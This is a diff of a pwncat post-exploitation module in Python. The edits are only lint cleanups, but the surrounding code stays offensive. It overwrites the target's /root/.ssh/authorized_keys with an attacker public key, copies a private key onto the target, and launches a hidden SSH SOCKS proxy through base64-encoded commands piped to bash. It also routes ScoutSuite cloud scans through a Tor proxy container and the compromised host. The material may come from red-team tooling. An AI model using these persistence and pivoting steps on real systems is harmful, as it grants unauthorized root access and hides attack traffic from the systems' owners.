@@ -1,11 +1,8 @@
 #!/usr/bin/env python3
-from io import StringIO
 import os
-from pwncat import util
-from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
+from pwncat.modules import BaseModule
 from pwncat.manager import Session
 from pwncat.platform.linux import Linux
-from jinja2 import Environment, FileSystemLoader
 from pathlib import Path
 import subprocess
 import shutil
@@ -29,7 +26,7 @@ class Module(BaseModule):
         session_lock = Path("/tmp/pwncat_session.lock")
 
         try:
-            session.log(f"creating session lock: /tmp/pwncat_session.lock")
+            session.log("creating session lock: /tmp/pwncat_session.lock")
             session_lock.touch()
 
             # multi log handler
@@ -163,7 +160,7 @@ class Module(BaseModule):
                 container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                 try:
                     payload = base64.b64encode(
-                        f'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy'.encode('utf-8'))
+                        'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy'.encode('utf-8'))
                     result = subprocess.run(
                         ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                     log(f'Return Code: {result.returncode}')
@@ -171,9 +168,9 @@ class Module(BaseModule):
                     log(f'Error Output: {result.stderr}')
 
                     if result.returncode != 0:
-                        log(f'The bash script encountered an error.')
+                        log('The bash script encountered an error.')
                     else:
-                        log(f"successfully started torproxy docker.")
+                        log("successfully started torproxy docker.")
                         log(
                             f"stopping and removing and {script} tunnelled container proxychains-{jobname}-{csp}...")
                         payload = base64.b64encode(
@@ -185,7 +182,7 @@ class Module(BaseModule):
                         log(f'Error Output: {result.stderr}')
 
                         if result.returncode != 0:
-                            log(f'The bash script encountered an error.')
+                            log('The bash script encountered an error.')
 
                         log(f"running {script} via torproxy tunnelled container...")
 
@@ -206,7 +203,7 @@ class Module(BaseModule):
                         log(f'Error Output: {result.stderr}')
 
                         if result.returncode != 0:
-                            log(f'The bash script encountered an error.')
+                            log('The bash script encountered an error.')
                 except Exception as e:
                     log(f'Error executing bash script: {e}')
 
@@ -305,21 +302,21 @@ class Module(BaseModule):
 
                 # transfer files from target to attacker
                 log("copying private key to target...")
-                with open(f'/home/socksuser/.ssh/socksuser_key', 'rb') as f1:
+                with open('/home/socksuser/.ssh/socksuser_key', 'rb') as f1:
                     with session.platform.open('/tmp/sockskey', 'wb') as f2:
                         f2.write(f1.read())
                 result = session.platform.run(
-                    f"/bin/bash -c 'chmod 0600 /tmp/sockskey'",
+                    "/bin/bash -c 'chmod 0600 /tmp/sockskey'",
                     cwd="/tmp", timeout=900)
                 log("adding public key to authorized on target...")
-                with open(f'/home/socksuser/.ssh/socksuser_key.pub', 'rb') as f1:
+                with open('/home/socksuser/.ssh/socksuser_key.pub', 'rb') as f1:
                     with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
                         f2.write(f1.read())
 
                 # create socksproxy on target
                 log('starting socksproxy on target...')
                 payload = base64.b64encode(
-                    f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
+                    'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
                     cwd="/tmp", timeout=900)
@@ -363,7 +360,7 @@ class Module(BaseModule):
             log("Removing sesssion lock...")
             session_lock.unlink()
 
-            log(f"Done.")
+            log("Done.")
         except Exception as e:
 
             session.log(f'Error executing bash script: {e}')
